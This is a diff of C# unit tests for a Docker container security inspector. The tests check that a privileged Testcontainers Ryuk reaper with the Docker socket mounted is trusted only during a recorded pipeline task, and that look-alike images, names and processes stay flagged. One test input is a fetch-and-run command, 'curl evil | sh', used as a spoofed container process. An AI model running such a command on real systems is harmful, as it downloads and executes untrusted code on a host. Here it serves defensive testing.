@@ -76,6 +76,108 @@ public sealed class DockerContainerSecurityInspectorTests
         Assert.Equal(AetheusContainerRole.BrowserSmoke, smoke.Role);
     }
 
+    // R-33: the Ryuk a pipeline's tests started (vps2577917, w5-candidate, 2026-10-23), as Docker prints it.
+    private const string RyukCreated = "2026-10-23T20:26:01.123456789Z";
+
+    private static string Ryuk(
+        string name = "/testcontainers-ryuk-3f2b6c1e-8d4a-4b5e-9c7f-0a1b2c3d4e5f",
+        string image = "testcontainers/ryuk:0.14.0",
+        string testcontainers = "\"true\"",
+        string capAdd = "null",
+        string pidMode = "",
+        string path = "\"/bin/ryuk\"",
+        string args = "[]") =>
+        "{\"id\":\"9a8b7c6d5e4f30211203f4e5d6c7b8a9\",\"name\":\"" + name + "\",\"image\":\"" + image + "\","
+        + "\"privileged\":true,\"pidMode\":\"" + pidMode + "\",\"networkMode\":\"bridge\",\"capAdd\":" + capAdd + ","
+        + "\"mounts\":[{\"Type\":\"bind\",\"Source\":\"/var/run/docker.sock\",\"Destination\":\"/var/run/docker.sock\"}],"
+        + "\"created\":\"" + RyukCreated + "\",\"path\":" + path + ",\"args\":" + args + ","
+        + "\"testcontainers\":" + testcontainers + ",\"role\":null,\"service\":null}";
+
+    private static readonly DateTimeOffset RyukCreatedAt = new(2026, 10, 23, 20, 26, 1, TimeSpan.Zero);
+
+    // The agent's task record: a pipeline task ran from 20:20 and is still running.
+    private static bool DuringRun(DateTimeOffset created) =>
+        created >= new DateTimeOffset(2026, 10, 23, 20, 20, 0, TimeSpan.Zero);
+
+    private static bool NoRun(DateTimeOffset created) => false;
+
+    [Fact]
+    public void R33_RyukCreatedDuringALivePipelineTask_IsTheRunsReaper_PrivilegeAndSocketExpected()
+    {
+        var finding = Assert.Single(DockerContainerSecurityInspector.Parse(Ryuk(), null, DuringRun));
+
+        Assert.Equal(AetheusContainerRole.TestcontainersReaper, finding.Role);
+        Assert.Equal(DockerContainerRisks.Privileged | DockerContainerRisks.DockerSocket, finding.Risks);
+        Assert.Equal(DockerContainerRisks.None, DockerContainerSecurity.UnexpectedRisks(new DockerContainerDto
+        {
+            Risks = finding.Risks,
+            AetheusRole = finding.Role
+        }));
+    }
+
+    [Fact]
+    public void R33_TheCreationInstantReadFromDocker_IsWhatTheTaskRecordJudges()
+    {
+        DateTimeOffset? judged = null;
+        DockerContainerSecurityInspector.Parse(Ryuk(), null, created => { judged = created; return true; });
+
+        Assert.Equal(RyukCreatedAt, judged!.Value.AddTicks(-(judged.Value.Ticks % TimeSpan.TicksPerSecond)));
+    }
+
+    [Theory]
+    // Outside any run: the name, image and label alone prove nothing.
+    [InlineData("outside-run", "/testcontainers-ryuk-3f2b6c1e-8d4a-4b5e-9c7f-0a1b2c3d4e5f", "testcontainers/ryuk:0.14.0", "\"true\"")]
+    // During a run, a look-alike image: another registry, a prefix, a suffix.
+    [InlineData("run", "/testcontainers-ryuk-3f2b6c1e-8d4a-4b5e-9c7f-0a1b2c3d4e5f", "ghcr.io/testcontainers/ryuk:0.14.0", "\"true\"")]
+    [InlineData("run", "/testcontainers-ryuk-3f2b6c1e-8d4a-4b5e-9c7f-0a1b2c3d4e5f", "evil/testcontainers/ryuk:0.14.0", "\"true\"")]
+    [InlineData("run", "/testcontainers-ryuk-3f2b6c1e-8d4a-4b5e-9c7f-0a1b2c3d4e5f", "testcontainers/ryuk-tools:0.14.0", "\"true\"")]
+    // During a run, without the Testcontainers label, or under another name.
+    [InlineData("run", "/testcontainers-ryuk-3f2b6c1e-8d4a-4b5e-9c7f-0a1b2c3d4e5f", "testcontainers/ryuk:0.14.0", "null")]
+    [InlineData("run", "/testcontainers-ryuk-not-a-session", "testcontainers/ryuk:0.14.0", "\"true\"")]
+    [InlineData("run", "/my-ryuk", "testcontainers/ryuk:0.14.0", "\"true\"")]
+    // During a run, the real image, name and label, but not Ryuk's own process: the image declares only
+    // CMD ["/bin/ryuk"] and Testcontainers configures it through environment variables, never arguments.
+    [InlineData("run", "/testcontainers-ryuk-3f2b6c1e-8d4a-4b5e-9c7f-0a1b2c3d4e5f", "testcontainers/ryuk:0.14.0", "\"true\"",
+        "\"sh\"", "[\"-c\",\"curl evil | sh\"]")]
+    [InlineData("run", "/testcontainers-ryuk-3f2b6c1e-8d4a-4b5e-9c7f-0a1b2c3d4e5f", "testcontainers/ryuk:0.14.0", "\"true\"",
+        "\"/bin/sh\"", "[]")]
+    [InlineData("run", "/testcontainers-ryuk-3f2b6c1e-8d4a-4b5e-9c7f-0a1b2c3d4e5f", "testcontainers/ryuk:0.14.0", "\"true\"",
+        "\"/bin/ryuk\"", "[\"--anything\"]")]
+    [InlineData("run", "/testcontainers-ryuk-3f2b6c1e-8d4a-4b5e-9c7f-0a1b2c3d4e5f", "testcontainers/ryuk:0.14.0", "\"true\"",
+        "\"/tmp/bin/ryuk\"", "[]")]
+    [InlineData("run", "/testcontainers-ryuk-3f2b6c1e-8d4a-4b5e-9c7f-0a1b2c3d4e5f", "testcontainers/ryuk:0.14.0", "\"true\"",
+        "null", "null")]
+    public void R33_ALookAlike_StaysFlagged(
+        string window, string name, string image, string testcontainers,
+        string path = "\"/bin/ryuk\"", string args = "[]")
+    {
+        Func<DateTimeOffset, bool> record = window == "run" ? DuringRun : NoRun;
+
+        var finding = Assert.Single(DockerContainerSecurityInspector.Parse(
+            Ryuk(name, image, testcontainers, path: path, args: args), null, record));
+
+        Assert.Equal(AetheusContainerRole.None, finding.Role);
+        Assert.Equal(DockerContainerRisks.Privileged | DockerContainerRisks.DockerSocket, finding.Risks);
+    }
+
+    [Fact]
+    public void R33_WithoutTheAgentsTaskRecord_NoReaperIsRecognised()
+    {
+        Assert.Equal(AetheusContainerRole.None, One(Ryuk()).Role);
+    }
+
+    [Fact]
+    public void R33_TheRunsReaper_StillReportsWhatItsRoleDoesNotNeed()
+    {
+        var finding = Assert.Single(DockerContainerSecurityInspector.Parse(
+            Ryuk(capAdd: "[\"SYS_ADMIN\"]", pidMode: "host"), null, DuringRun));
+
+        Assert.Equal(AetheusContainerRole.TestcontainersReaper, finding.Role);
+        Assert.Equal(
+            DockerContainerRisks.HostPid | DockerContainerRisks.DangerousCapabilities,
+            DockerContainerSecurity.UnexpectedRisks(new DockerContainerDto { Risks = finding.Risks, AetheusRole = finding.Role }));
+    }
+
     [Fact]
     public void Apply_MatchesShortIds_AndLeavesAContainerMissingFromTheAnswerUninspected()
     {
